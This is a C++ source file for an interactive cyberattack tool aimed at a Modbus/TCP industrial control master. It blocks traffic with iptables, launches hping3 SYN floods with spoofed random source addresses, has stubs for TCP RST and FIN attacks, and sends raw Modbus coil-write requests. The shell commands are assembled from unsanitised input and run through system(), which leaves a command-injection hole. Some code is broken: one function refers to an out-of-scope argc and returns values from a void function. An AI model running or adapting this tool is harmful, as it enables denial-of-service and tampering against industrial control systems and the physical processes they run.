#include<iostream>
#include<sstream>
#include<string>
#include<stdlib.h>
#include <modbus.h>
#include <errno.h>


using namespace std;

#ifdef DEBUG
#define print(x) cout<<x
#else
#define print(x) 
#endif

enum cyberattacks {
     BLOCK=1,
     UNBLOCK,
     SYNFLOOD,
     RST,
     FIN
};

enum tcpfloodattacktypes {
     FLOOD=1,
     FIXEDDURATION,
     FASTPACKETCOUNTFLOOD,
     PACKETSPERSEC,
     ENDOFENUM
};
string floodAttackString[ENDOFENUM-1]={"FLOOD",
                                       "FIXEDDURATION",
                                       "FASTPACKETCOUNTFLOOD",
                                       "PACKETSPERSEC",
                                       };

string globalDisplayString = "Please select a Cyber Attack To Perform.\n 1. Block the communication towards master.\n 2. Unblock Traffic \n 3. Execute a SYN flood attack towards the Modbus Master\n 4. Execute a TCP RST attack towards the Modbus Master\n 5. Execute a TCP FIN attack towards the Modbus Master\n";

//Process Functions
                             
void displayOptions(void);
bool validateInput(int inputOption);
void processInput(int inputOption);

//Attack Functions
void inputBlockTrafficParameters(string &ip,string &port);
void blockTraffic(const string ip,const string port);
void unblockTraffic(const string ip, const string port);

// TCP flood functions
void tcpSynFloodAttack(void);
tcpfloodattacktypes selectTcpSynFloodAttack(void);

//Modbus packet generation function
void sendModbusPacket(void);


int main(int argv,char *argc[])
{
   
    displayOptions();

    return 0;
}


void displayOptions(void)
{
   cout<<globalDisplayString;
   //int inputOption=-1;
   int inputOption=0;
   string inputStr="";
   while(1)
   {
      //cout<<"Please enter a selection to continue ::";
      print("Please enter a selection to continue ::");
      getline(cin,inputStr);
      stringstream inputStream(inputStr);
      if( !(inputStream >> inputOption) )
      {
        //cout<<"Invalid input"<<endl;
        print("Invalid input"<<endl);
        continue;
      }   
      else
      {
        //cout<<"Valid input"<<endl;
        if(validateInput(inputOption))
        {
           print("Valid input"<<endl);
           processInput(inputOption);
           break;
        }
        else
           print("Invalid input range"<<endl);
      }
   }
  
}

bool validateInput(int inputOption)
{
   bool ret=false;
   if((inputOption < BLOCK) || (inputOption > FIN))
   {
      print("Input Validation Failed"<<endl);
   }
   else
   {
      print("Input Validated"<<endl);
      ret=true;
   }
   return ret;
}
void processInput(int inputOption)
{
    switch(inputOption)
    {
       case BLOCK:
          {
          print("BLOCK TRAFFIC"<<endl);
          string ip="",port="";
          inputBlockTrafficParameters(ip,port);
          blockTraffic(ip,port);
          }
          break;
       case UNBLOCK:
          {
          print("UNBLOCK TRAFFIC"<<endl);
          string ip="",port="";
          inputBlockTrafficParameters(ip,port);
          unblockTraffic(ip,port);
          }
          break;
       case SYNFLOOD:
          print("SYN FLOOD TRAFFIC"<<endl);
          tcpSynFloodAttack();
          break;
       case RST:
          print("RST TRAFFIC"<<endl);
          break;
       case FIN:
          print("FIN TRAFFIC"<<endl);
          break;
       default:
          break;
    }
}
void inputBlockTrafficParameters(string &ip,string &port)
{
   string inputStr="";
   print("Please enter the IP of master to block ::");
   getline(cin,inputStr);
   {
     stringstream inputStream(inputStr);
     inputStream >> ip;
   }
   inputStr="";
   print("Please enter the TCP port of master to block ::");
   getline(cin,inputStr);
   {
     stringstream inputStream(inputStr);
     inputStream >> port;
   }
   print("Input Ip : "<<ip<<"Input Port "<<port<<endl); 

}
void blockTraffic(const string ip,const string port)
{
    string commandStr="iptables -A OUTPUT -s " + ip + " -p tcp --dport " + port + " -j DROP";
    print(commandStr<<endl);
    system(commandStr.c_str());
    print("The Current firewall rules are as below. "<<endl);
    system("iptables -L -n");
}
void unblockTraffic(const string ip,const string port)
{
    string commandStr="iptables -D OUTPUT -s "+ip+" -p tcp --dport "+port+ " -j DROP";
    print(commandStr<<endl);
    system(commandStr.c_str());
    print("The Current firewall rules are as below. "<<endl);
    system("iptables -L -n");
}
void tcpSynFloodAttack(void)
{
    
   tcpfloodattacktypes tcpAttackType = selectTcpSynFloodAttack();
   print("Flood Attack Type" << tcpAttackType<<endl);
   string packetCount="",packetSize="",port="",targetIP="",packetPerSec="",packetDuration="";
   print("Input the size of each packet to send :: ");
   getline(cin,packetSize); 
   print("Input the ip of the target Master :: ");
   getline(cin,targetIP); 
   print("Input the port of the target Master :: ");
   getline(cin,port); 
   string commandStr="";

   switch(tcpAttackType)
   {
      case FLOOD:
      {
         print("Input the number of packets to send :: ");
         getline(cin,packetCount);
         commandStr= "hping3 -c " + packetCount + 
                      " -d " + packetSize +
                      " -S -w 64 -p " + port +
                      " --flood --rand-source " + targetIP;
      }       
        break;
      case FIXEDDURATION:
      {
        
        print("Input the number of seconds to send the packets :: ");
        getline(cin,packetDuration);
        int pD,pPS;
        {
          stringstream inputStream(packetDuration);
          inputStream >> pD;
        }
        print("Input the  number of packets to send per second :: ");
        getline(cin,packetPerSec);
        {
          stringstream inputStream(packetPerSec);
          inputStream >> pPS;
        }
        int totalPkts=pD*pPS;
        packetCount=static_cast<ostringstream *>(&(ostringstream() << (totalPkts)) )->str();
        string packetInterval="u"+(static_cast<ostringstream *>(&(ostringstream() << (pPS*1000)) )->str());
        commandStr= "hping3 -c " + packetCount + 
                      " -d " + packetSize +
                      " -S -w 64 -i "+packetInterval+ " -p " + port +
                      " --rand-source " + targetIP;

      }
        break;
      case FASTPACKETCOUNTFLOOD:
      {
      }
        break;
      case PACKETSPERSEC:
      {
        int pPS;
        print("Input the  number of packets to send per second ::");
        getline(cin,packetPerSec);
        {
          stringstream inputStream(packetPerSec);
          inputStream >> pPS;
        }
        string packetInterval="u"+(static_cast<ostringstream *>(&(ostringstream() << (pPS*1000)) )->str());
        commandStr= "hping3 -c " + packetCount + 
                      " -d " + packetSize +
                      " -S -w 64 -i "+packetInterval+ " -p " + port +
                      " --rand-source " + targetIP;
      }
        break;
      default:
        break;
   }



  print(commandStr<<endl);
  system(commandStr.c_str());
                      
}
tcpfloodattacktypes selectTcpSynFloodAttack(void)
{
  
  string displayStr="";
  string numstr="";
  int i =FLOOD-1;
  for( ;i<ENDOFENUM-1;i++)
  {
   numstr=static_cast<ostringstream *>(&(ostringstream() << (i+1)) )->str();
   displayStr += numstr + "."+floodAttackString[i]+" \n";
  }
  print(displayStr);
  print("Select the type of SYN Flood attack to carry out :: ");
  string inputStr="";
  getline(cin,inputStr);
  stringstream inputStream(inputStr);
  int floodOption=-1;
  inputStream >> floodOption;

  return (tcpfloodattacktypes)floodOption;
}

void sendModbusPacket(void)
{
  modbus_t *mb;
  modbus_t *mb2;
  uint16_t tab_reg[32];
  std::string modbusSlave=argc[1];
  //Modbus slave which is a TCP master
  cout<<modbusSlave<<endl;
  mb = modbus_new_tcp(modbusSlave.c_str(),502);
  if (modbus_connect(mb) == -1) {
               fprintf(stderr, "Connection failed: %s\n", modbus_strerror(errno));
               modbus_free(mb);
               return -1;
   }

  mb2 = modbus_new_tcp(modbusSlave.c_str(),501);
  if (modbus_connect(mb2) == -1) {
               fprintf(stderr, "Connection failed: %s\n", modbus_strerror(errno));
               modbus_free(mb);
               return -1;
   }
  /* Read 5 registers from the address 0 */
  //modbus_read_registers(mb, 1, 4, tab_reg);

  //uint8_t raw_req[] = {0x01/*slave id*/, 0x0B/*func code*/, 0x00, 0x01/*ref num*/, 0x00, 0x00/*word count*/ }; 
  //Request slave id;
  uint8_t raw_req[] = {0x01/*slave id*/, 0xf/*func code*/,0x03,0xea,0x00,0x02,0x1,0x1}; 
  int req_length = modbus_send_raw_request(mb, raw_req, 8 * sizeof(uint8_t));
  uint8_t raw_req2[] = {0x01/*slave id*/, 0xf/*func code*/,0x03,0xea,0x00,0x02,0x1,0x1}; 
  //req_length = modbus_send_raw_request(mb2, raw_req2, 8 * sizeof(uint8_t));
  //uint8_t raw_req3[] = {0x02/*slave id*/, 0x04/*func code*/,0x00,0x00,0x00,0x03}; 
  //req_length = modbus_send_raw_request(mb2, raw_req3, 6 * sizeof(uint8_t));
  //req_length = modbus_send_raw_request(mb2, raw_req3, 6 * sizeof(uint8_t));
  //req_length = modbus_send_raw_request(mb2, raw_req3, 6 * sizeof(uint8_t));
  uint8_t rsp[MODBUS_TCP_MAX_ADU_LENGTH];


  //modbus_receive_confirmation(mb, rsp);
  
  modbus_close(mb2);
  modbus_free(mb2);
  modbus_close(mb);
  modbus_free(mb);

}
